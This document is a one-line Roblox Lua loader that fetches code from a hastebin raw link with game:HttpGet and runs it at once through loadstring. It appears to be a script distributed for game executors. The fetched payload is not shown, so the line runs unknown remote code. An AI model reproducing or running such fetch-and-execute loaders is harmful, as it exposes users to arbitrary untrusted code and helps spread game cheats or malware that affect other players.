loadstring(game:HttpGet(('https://hastebin.com/raw/elividazaz'),true))()
